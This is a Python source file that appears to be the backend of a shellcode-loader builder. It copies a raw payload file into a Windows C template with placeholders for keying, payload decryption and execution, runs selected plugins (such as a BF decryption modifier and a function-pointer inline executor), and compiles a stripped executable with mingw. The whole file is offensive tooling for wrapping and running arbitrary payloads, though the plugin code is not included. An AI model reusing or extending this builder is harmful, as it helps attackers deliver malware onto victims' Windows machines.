import os
import shutil
import importlib
import subprocess

class Logger:
    @staticmethod
    def info(message):
        print(f"[\033[34m*\033[0m] {message}")

    @staticmethod
    def success(message):
        print(f"[\033[32m+\033[0m] {message}")

    @staticmethod
    def debug(message):
        print(f"[\033[33m^\033[0m] {message}")

    @staticmethod
    def error(message):
        print(f"[\033[31m!\033[0m] {message}")

    @staticmethod
    def section(message):
        print(f"\t[\033[93m-\033[0m] {message}")

    @staticmethod
    def subsection(message):
        print(f"\t\t[\033[95m>\033[0m] {message}")

# Init logger
Log = Logger()

def setStatus():
    filename = f'./status'

    try:
        with open(filename, 'r') as file:
            # File exists, now overwrite its contents with "Finished"
            pass
        with open(filename, 'w') as file:
            file.write("Finished")
    except FileNotFoundError:
        # File does not exist, create it and write "Working"
        with open(filename, 'w') as file:
            file.write("Working")

def setTemplate():
    os.makedirs(f'./src/')

    filename = f'./src/main.c'

    template = '''\
#include <windows.h>
{{LIBS}}

{{FUNCTIONS}}

const unsigned char pPayload[] = {
	{{PAYLOAD}}
};

int main() {
{{KEYING}}

{{PAYLOAD_MODS}}

{{EXECUTION}}

	return 0;
}\
'''

    with open(filename, 'w') as file:
        file.write(template)

def setMakefile():
    filename = f'./makefile'

    content = '''\
ProjectName		= result

CCX64			= x86_64-w64-mingw32-gcc

CFLAGS			=  -Os -fno-asynchronous-unwind-tables
CFLAGS 			+= -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS  		+= -s -ffunction-sections -falign-jumps=1 -w
CFLAGS			+= -Wl,-s,--no-seh,--enable-stdcall-fixup
{{CFLAGS}}

CLIBS			= {{CLIBS}}

SOURCES			=  src/*.c

all: x64

x64:
	@ $(CCX64) $(SOURCES) $(CFLAGS) $(CLIBS) -o $(ProjectName).exe
\
'''

    with open(filename, 'w') as file:
        file.write(content)

def cleanTemplate():
    filename = f'./src/main.c'

    # Open the file in read mode
    with open(filename, 'r') as file:
        content = file.read()
    
    # Clean Template
    content = content.replace('\n{{LIBS}}\n', '')
    content = content.replace('\n{{FUNCTIONS}}', '')
    content = content.replace('\n{{PAYLOAD}}', '')
    content = content.replace('\n{{KEYING}}', '')
    content = content.replace('\n{{PAYLOAD_MODS}}', '')
    content = content.replace('\n{{EXECUTION}}', '')

    # Open the file in write mode and write the modified content
    with open(filename, 'w') as file:
        file.write(content)

def cleanMakefile():
    filename = f'./makefile'

    # Open the file in read mode
    with open(filename, 'r') as file:
        content = file.read()
    
    # Clean Template
    content = content.replace('\n{{CFLAGS}}\n', '')
    content = content.replace(' {{CLIBS}}', '')

    # Open the file in write mode and write the modified content
    with open(filename, 'w') as file:
        file.write(content)

def generateLdr(id, plugins):
    os.chdir(f'./uploads/{id}')
    Log.info(f"[\033[34m{id}\033[0m] Setting working status")
    setStatus()

    Log.info(f"[\033[34m{id}\033[0m] Setting makefile")
    setMakefile()

    Log.info(f"[\033[34m{id}\033[0m] Setting template")
    setTemplate()

    Log.info(f"[\033[34m{id}\033[0m] Running plugins")

    # Run Keying
    for plugin in plugins["keying"]:
        plugPath = "plugins" + plugin.replace("/", ".") + ".run"
        Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
        importlib.import_module(plugPath).run()
        
    # Run Payload mods
    for plugin in plugins["payload_mods"]:
        plugPath = "plugins" + plugin.replace("/", ".") + ".run"
        Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
        importlib.import_module(plugPath).run()

    # Run Execution
    for plugin in plugins["execution"]:
        plugPath = "plugins" + plugin.replace("/", ".") + ".run"
        Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
        importlib.import_module(plugPath).run()

    # Run Pre Compilation
    for plugin in plugins["pre_comp"]:
        plugPath = "plugins" + plugin.replace("/", ".") + ".run"
        Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
        importlib.import_module(plugPath).run()

    # Run Post Compilation
    for plugin in plugins["post_comp"]:
        plugPath = "plugins" + plugin.replace("/", ".") + ".run"
        Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
        importlib.import_module(plugPath).run()

    Log.info(f"[\033[34m{id}\033[0m] Cleaning up makefile")
    cleanMakefile()

    Log.info(f"[\033[34m{id}\033[0m] Cleaning up template")
    cleanTemplate()

    Log.info(f"[\033[34m{id}\033[0m] Compiling loader")
    make_process = subprocess.Popen("make", stderr=subprocess.STDOUT)
    if make_process.wait() != 0:
        Log.error(f"[\033[34m{id}\033[0m] Error when compiling")
    Log.info(f"[\033[34m{id}\033[0m] Compiling completed")
    
    Log.info(f"[\033[34m{id}\033[0m] Work done, updating status")
    setStatus() 

    os.chdir(f'./../..')

if __name__ == "__main__":
    id = "dahhfdgsfjhagfdjgawhriweancvbasdf"
    os.makedirs(f'./uploads/{id}')
    shutil.copy('payload.bin', f'./uploads/{id}/payload.bin')

    plugins = {
                "execution": [
                    "/execution/local/FPInline"
                ],
                "keying": [
                    
                ],
                "payload_mods": [
                    "/payload_mods/encryption/BFDecryption"
                ],
                "post_comp": [
                    
                ],
                "pre_comp": [
                    
                ]
            }

    generateLdr(id, plugins)

    # Remove directory
    Log.info(f"[\033[34m{id}\033[0m] Removing temp dir")
    #shutil.rmtree(f'./uploads/{id}')